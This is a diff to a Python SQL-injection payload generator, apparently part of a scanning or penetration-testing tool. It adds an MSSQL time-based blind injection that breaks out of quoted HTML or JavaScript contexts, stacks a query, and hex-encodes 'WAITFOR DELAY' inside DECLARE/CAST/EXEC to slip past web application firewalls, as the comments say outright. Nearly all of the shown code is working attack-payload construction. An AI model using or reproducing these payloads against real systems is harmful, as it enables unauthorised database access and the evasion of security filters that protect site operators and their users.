@@ -23,12 +23,30 @@ class AstPayloadGenerator:
         """Generates time-based payloads."""
         payloads = []
 
+        # --- MSSQL Special Handling for WAITFOR (Stacked Query with Obfuscation) ---
+        if self.dialect == "mssql":
+            delay_str = f"0:0:{sleep_time}"
+            # Advanced WAF bypass using hex-encoded payload and EXEC.
+            # This avoids keywords like 'WAITFOR' and 'DELAY' in the main query.
+            # Hex for "WAITFOR DELAY '" is 0x57414954464F522044454C41592027
+            # Hex for "'" is 0x27
+            hex_encoded_payload = "0x57414954464F522044454C41592027" + delay_str.encode().hex() + "27"
+            payload_fragment = f";DECLARE @S VARCHAR(4000);SET @S=CAST({hex_encoded_payload} AS VARCHAR(4000));EXEC(@S);--"
+
+            # Use the context to add the correct quote/comment.
+            if context in ["HTML_ATTRIBUTE_SINGLE_QUOTED", "JS_STRING_SINGLE_QUOTED"]:
+                sql = "'" + payload_fragment
+            elif context in ["HTML_ATTRIBUTE_DOUBLE_QUOTED", "JS_STRING_DOUBLE_QUOTED"]:
+                sql = '"' + payload_fragment
+            else: # HTML_TEXT or unknown - assuming quote is needed to break out
+                sql = "'" + payload_fragment
+
+            payloads.append((sql, "MSSQL_WAITFOR_OBFUSCATED"))
+            return payloads
+
         # Base sleep functions per dialect
         if self.dialect == "postgresql":
             sleep_func = exp.Anonymous(this="pg_sleep", params=[sleep_time])
-        elif self.dialect == "mssql":
-            delay_str = f"0:0:{sleep_time}"
-            sleep_func = exp.WaitFor(delay=exp.Literal.string(delay_str))
         elif self.dialect == "sqlite":
             # The COUNT(*) method was ineffective. A better method is to force a computationally
             # expensive operation. We use a nested query with RANDOMBLOB to make it harder
